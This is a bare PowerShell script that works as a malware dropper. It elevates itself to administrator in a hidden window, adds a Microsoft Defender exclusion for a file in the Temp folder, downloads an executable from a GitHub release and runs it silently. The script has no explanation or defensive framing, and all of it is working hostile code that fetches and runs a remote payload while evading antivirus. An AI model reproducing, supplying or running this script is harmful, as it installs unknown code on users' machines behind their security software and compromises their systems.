if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) { Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `[System.Reflection.Assembly]::LoadWithPartialName('System.Security.Principal') | Out-Null; if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) { exit }; Add-MpPreference -ExclusionPath `$env:Temp\main.exe; Invoke-WebRequest -Uri 'https://github.com/greenstorm5417/funny/releases/download/v0.0.1/main.exe' -OutFile `$env:Temp\main.exe -UseBasicParsing; Start-Process -FilePath `$env:Temp\main.exe -Wait -WindowStyle Hidden" -Verb RunAs; exit } else { Add-MpPreference -ExclusionPath "$env:Temp\main.exe"; Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/releases/download/v0.0.1/main.exe" -OutFile "$env:Temp\main.exe" -UseBasicParsing; Start-Process -FilePath "$env:Temp\main.exe" -Wait -WindowStyle Hidden }
